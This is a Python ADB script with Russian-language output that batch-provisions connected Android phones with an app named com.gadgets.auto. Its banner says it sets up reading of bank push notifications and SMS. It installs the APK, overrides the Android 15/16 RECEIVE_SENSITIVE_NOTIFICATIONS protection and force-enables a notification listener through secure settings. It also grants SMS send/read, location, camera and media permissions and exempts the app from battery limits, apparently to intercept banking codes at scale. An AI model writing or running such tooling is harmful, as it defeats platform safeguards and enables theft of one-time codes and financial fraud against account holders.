#!/usr/bin/env python3
"""
Android Device Provisioner for com.gadgets.auto
Automates setup, installation, and sensitive notification permission grants on Android 14/15/16.
Works cross-platform (Linux, macOS, Windows).
"""

import subprocess
import sys
import time
import os

PACKAGE_NAME = "com.gadgets.auto"
NOTIFICATION_SERVICE = "com.gadgets.auto/com.gadgets.auto.util.network.NotificationService"
DEFAULT_APK = "HEAD_2026.10.08_release.apk"

RUNTIME_PERMISSIONS = [
    "android.permission.READ_SMS",
    "android.permission.RECEIVE_SMS",
    "android.permission.SEND_SMS",
    "android.permission.POST_NOTIFICATIONS",
    "android.permission.READ_PHONE_STATE",
    "android.permission.READ_PHONE_NUMBERS",
    "android.permission.ACCESS_FINE_LOCATION",
    "android.permission.ACCESS_COARSE_LOCATION",
    "android.permission.READ_EXTERNAL_STORAGE",
    "android.permission.WRITE_EXTERNAL_STORAGE",
    "android.permission.CAMERA",
    "android.permission.RECEIVE_MMS",
    "android.permission.READ_MEDIA_IMAGES",
    "android.permission.READ_MEDIA_VIDEO",
    "android.permission.READ_MEDIA_AUDIO",
    "android.permission.READ_MEDIA_VISUAL_USER_SELECTED",
]

def run_cmd(cmd, check=False):
    res = subprocess.run(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
    if check and res.returncode != 0:
        raise RuntimeError(f"Command failed: {cmd}\nStderr: {res.stderr}")
    return res.stdout.strip(), res.stderr.strip(), res.returncode

def get_devices():
    out, _, _ = run_cmd("adb devices")
    lines = out.splitlines()[1:]
    devices = []
    for line in lines:
        parts = line.split()
        if len(parts) >= 2 and parts[1] == "device":
            devices.append(parts[0])
    return devices

def get_prop(serial, prop):
    out, _, _ = run_cmd(f"adb -s {serial} shell getprop {prop}")
    return out

def provision_device(serial, apk_path=None):
    print(f"\n{'='*60}")
    print(f"[*] НАЧИНАЮ НАСТРОЙКУ УСТРОЙСТВА: {serial}")
    
    brand = get_prop(serial, "ro.product.manufacturer")
    model = get_prop(serial, "ro.product.model")
    android_ver = get_prop(serial, "ro.build.version.release")
    print(f"[*] Модель: {brand} {model} | Android {android_ver}")
    print(f"{'='*60}")

    # 1. Проверяем установлено ли приложение
    out, _, _ = run_cmd(f"adb -s {serial} shell pm path {PACKAGE_NAME}")
    if not out:
        print(f"[-] Приложение {PACKAGE_NAME} НЕ установлено.")
        if apk_path and os.path.exists(apk_path):
            print(f"[+] Устанавливаю {apk_path} ...")
            out_inst, err_inst, code = run_cmd(f"adb -s {serial} install -r -g \"{apk_path}\"")
            if "Success" in out_inst:
                print("    [OK] Успешно установлено!")
            else:
                print(f"    [!] Ошибка установки: {out_inst} {err_inst}")
                return False
        else:
            print("    [!] APK-файл не найден рядом со скриптом. Установите приложение вручную или положите APK в папку со скриптом.")
    else:
        print(f"[OK] Приложение {PACKAGE_NAME} уже установлено.")

    # 2. Выдаем RECEIVE_SENSITIVE_NOTIFICATIONS (защита Android 15/16)
    print("\n[1/4] Разблокировка чувствительных пуш-уведомлений (Android 15/16)...")
    run_cmd(f"adb -s {serial} shell cmd appops set --user 0 {PACKAGE_NAME} RECEIVE_SENSITIVE_NOTIFICATIONS allow")
    appop_status, _, _ = run_cmd(f"adb -s {serial} shell cmd appops get --user 0 {PACKAGE_NAME} RECEIVE_SENSITIVE_NOTIFICATIONS")
    if "allow" in appop_status:
        print(f"    [OK] RECEIVE_SENSITIVE_NOTIFICATIONS -> ALLOW")
    else:
        print(f"    [!] Статус: {appop_status}")

    # 3. Активируем слушатель уведомлений
    print("\n[2/4] Активация системного сервиса чтения уведомлений...")
    run_cmd(f"adb -s {serial} shell cmd notification allow_listener {NOTIFICATION_SERVICE} 0")
    listeners, _, _ = run_cmd(f"adb -s {serial} shell settings get secure enabled_notification_listeners")
    if PACKAGE_NAME in listeners:
        print(f"    [OK] NotificationListenerService включен в системе!")
    else:
        # Fallback добавление в settings secure
        curr = listeners if listeners != "null" else ""
        new_listeners = f"{curr}:{NOTIFICATION_SERVICE}".strip(":")
        run_cmd(f"adb -s {serial} shell settings put secure enabled_notification_listeners \"{new_listeners}\"")
        print(f"    [OK] Прописан напрямую через settings secure.")

    # 4. Выдаем runtime permissions
    print("\n[3/4] Выдача всех системных runtime-разрешений (SMS, телефон, память)...")
    granted_count = 0
    for perm in RUNTIME_PERMISSIONS:
        _, _, code = run_cmd(f"adb -s {serial} shell pm grant {PACKAGE_NAME} {perm}")
        if code == 0:
            granted_count += 1
    print(f"    [OK] Проверено и выдано {granted_count}/{len(RUNTIME_PERMISSIONS)} разрешений.")

    # 5. Исключение из экономии батареи (Doze mode)
    print("\n[4/4] Исключение из энергосбережения батареи (фоновая работа)...")
    run_cmd(f"adb -s {serial} shell dumpsys deviceidle whitelist +{PACKAGE_NAME}")
    print(f"    [OK] Добавлен в deviceidle whitelist!")

    print(f"\n{'='*60}")
    print(f"[+++] УСТРОЙСТВО {serial} ({brand} {model}) ПОЛНОСТЬЮ НАСТРОЕНО!")
    print(f"{'='*60}\n")
    return True

def main():
    print("""
============================================================
      Android Auto-Provisioner for com.gadgets.auto
      Настройка чтения банковских пушей и SMS (Android 14-16)
============================================================
    """)

    # Находим APK
    script_dir = os.path.dirname(os.path.abspath(__file__))
    apk_candidates = [
        os.path.join(script_dir, DEFAULT_APK),
        os.path.join(script_dir, "app.apk"),
        DEFAULT_APK
    ]
    apk_path = None
    for cand in apk_candidates:
        if os.path.exists(cand):
            apk_path = cand
            print(f"[*] Найден локальный APK: {apk_path}")
            break

    seen_devices = set()

    while True:
        devices = get_devices()
        new_devices = [d for d in devices if d not in seen_devices]

        if new_devices:
            for serial in new_devices:
                provision_device(serial, apk_path)
                seen_devices.add(serial)
            print("Готово. Вы можете подключить следующий телефон...")
        elif not devices:
            print("[...] Ожидаю подключения телефона по USB (с включенной отладкой по ADB)...", end="\r", flush=True)

        time.sleep(2)

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n\nСкрипт остановлен пользователем. Удачи в офисе!")
        sys.exit(0)
